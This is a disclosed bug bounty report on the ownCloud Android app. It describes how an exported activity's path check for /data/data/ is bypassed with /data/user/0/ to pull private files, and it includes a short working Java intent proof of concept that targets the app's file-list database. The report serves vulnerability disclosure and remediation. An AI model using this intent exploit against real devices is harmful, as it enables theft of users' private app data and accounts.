# Possible to steal any protected files on Android

## Report Details
- **Report ID**: 377107
- **URL**: https://hackerone.com/reports/377107
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2018-07-04T13:55:25.764Z
- **Disclosed**: 2021-11-15T08:40:27.842Z

## Reporter
- **Username**: shell_c0de
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: owncloud

## Vulnerability Information
Hi. I have found an issue which allows to retrieve any files from `/data/data/com.owncloud.android/*` directory. The problem is in exported activity `com.owncloud.android.ui.activity.ReceiveExternalFilesActivity` which accepts a URI to download files. I see that you've added verification path `/data/data/`
You can bypass the verification using specifying an alternative path: `/data/user/0/com.owncloud.android/` 
Malicious code:
```java
        StrictMode.VmPolicy.Builder builder = new StrictMode.VmPolicy.Builder();
        StrictMode.setVmPolicy(builder.build());
        Intent intent = new Intent("android.intent.action.SEND");
        intent.setClassName("com.owncloud.android", "com.owncloud.android.ui.activity.ReceiveExternalFilesActivity");
        intent.setType("*/*");
        intent.setFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
        intent.putExtra("android.intent.extra.STREAM", Uri.parse("file:///data/user/0/com.owncloud.android/databases/filelist"));
        startActivity(intent);
```
###How to Fix
Add an alternative path to the folder check

## Impact

This vulnerability can get a complete account, malware can access everything, including, file database and history.

## Attachments
- owncloud_PoC.apk
- 2VkPnMdf2YY.jpg
- td0jJcli45Y.jpg
